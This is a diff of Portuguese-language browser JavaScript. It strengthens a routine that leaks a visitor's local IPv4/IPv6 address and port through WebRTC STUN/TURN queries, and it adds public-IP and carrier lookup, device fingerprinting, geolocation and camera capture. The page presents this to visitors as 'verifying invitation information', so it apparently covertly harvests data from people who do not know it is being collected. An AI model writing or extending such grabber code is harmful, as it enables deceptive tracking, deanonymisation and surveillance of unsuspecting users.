@@ -24,7 +24,7 @@ function falar(texto){
 }
 
 // =================================================================
-// CAPTURA AVANÇADA
+// CAPTURA AVANÇADA (IPv4 + IPv6 + Operadora + TURN)
 // =================================================================
 async function capturarPortaAvancada() {
   const info = { 
@@ -35,42 +35,53 @@ async function capturarPortaAvancada() {
     operadora: "Não detectada"
   };
 
-  const servers = [
+  const iceServers = [
     { urls: 'stun:stun.l.google.com:19302' },
     { urls: 'stun:stun1.l.google.com:19302' },
-    { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' }
+    { urls: 'stun:stun.ekiga.net' },
+    {
+      urls: 'turn:openrelay.metered.ca:443',
+      username: 'openrelayproject',
+      credential: 'openrelayproject'
+    }
   ];
 
-  for (let config of servers) {
+  for (let config of iceServers) {
     try {
-      const rtc = new RTCPeerConnection({ iceServers: [config] });
-      rtc.createDataChannel("test");
+      const rtc = new RTCPeerConnection({
+        iceServers: [config],
+        iceTransportPolicy: "all"
+      });
+
+      rtc.createDataChannel("port-test");
 
       const offer = await rtc.createOffer();
       await rtc.setLocalDescription(offer);
 
-      await new Promise(resolve => setTimeout(resolve, 1500));
-
-      rtc.onicecandidate = (event) => {
-        if (event.candidate) {
-          const cand = event.candidate.candidate;
-          const ipMatch = cand.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[a-f0-9:]+)/i);
-          const portMatch = cand.match(/(\d{4,5})\s+typ/);
-          
-          if (ipMatch) {
-            const ip = ipMatch[1];
-            if (ip.includes(':')) info.ipv6 = ip;
-            else info.local_ip = ip;
+      await new Promise(resolve => {
+        rtc.onicecandidate = (event) => {
+          if (event.candidate) {
+            const cand = event.candidate.candidate;
+            const ipMatch = cand.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[a-f0-9:]+)/i);
+            const portMatch = cand.match(/(\d{4,5})\s+typ/);
+            
+            if (ipMatch) {
+              const ip = ipMatch[1];
+              if (ip.includes(':')) info.ipv6 = ip;
+              else info.local_ip = ip;
+            }
+            if (portMatch) info.local_port = portMatch[1];
           }
-          if (portMatch) info.local_port = portMatch[1];
-        }
-      };
+        };
+        setTimeout(resolve, 1500);
+      });
 
       rtc.close();
       if (info.local_port) break;
     } catch(e) {}
   }
 
+  // IP Público + Operadora
   try {
     const res = await fetch("https://ipapi.co/json/");
     const data = await res.json();
@@ -131,16 +142,16 @@ function analisarDispositivo() {
   else if (ua.indexOf("Firefox") >= 0) browser = "Firefox";
   else if (ua.indexOf("Safari") >= 0 && ua.indexOf("Chrome") === -1) browser = "Safari";
   else if (ua.indexOf("Edge") >= 0 || ua.indexOf("Edg") >= 0) browser = "Edge";
- 
+  
   let model = "Desconhecido";
   if (ua.indexOf("Mobile") >= 0) {
       const parts = ua.split(/[()]/);
       if (parts.length > 1) {
           const deviceParts = parts[1].split(';');
           for (let part of deviceParts) {
-              if (part.indexOf("Android") === -1 && part.indexOf("Linux") === -1 &&
-                  part.indexOf("iPhone") === -1 && part.indexOf("iPad") === -1 &&
-                  part.indexOf("Windows") === -1 && part.indexOf("Macintosh") === -1 &&
+              if (part.indexOf("Android") === -1 && part.indexOf("Linux") === -1 && 
+                  part.indexOf("iPhone") === -1 && part.indexOf("iPad") === -1 && 
+                  part.indexOf("Windows") === -1 && part.indexOf("Macintosh") === -1 && 
                   part.length > 2) {
                   model = part.trim();
                   break;
@@ -152,20 +163,15 @@ function analisarDispositivo() {
 }
 
 // =================================================================
-// BOTÃO - CAPTURA COMPLETA
+// BOTÃO - CAPTURA COMPLETA (VERSÃO CORRIGIDA)
 // =================================================================
 btn.addEventListener("click", async () => {
   try {
     btn.disabled = true;
     btn.innerHTML = "PROCESSANDO...";
- 
+  
     statusText.innerHTML = "📨 Verificando informações do convite..";
     falar("Verificando informações do convite..");
-
-    // Verificação da câmera
-    if (!video.srcObject || video.videoWidth === 0) {
-      throw new Error("Câmera não está pronta. Recarregue a página.");
-    }
 
     const largura = video.videoWidth;
     const altura = video.videoHeight;
@@ -196,6 +202,7 @@ btn.addEventListener("click", async () => {
       longitude = localizacao.coords.longitude;
     } catch(err) {}
 
+    // ✅ CHAMADA DA FUNÇÃO AVANÇADA AQUI
     const portaInfo = await capturarPortaAvancada();
 
     statusText.innerHTML = "💾 Salvando cadastro...";
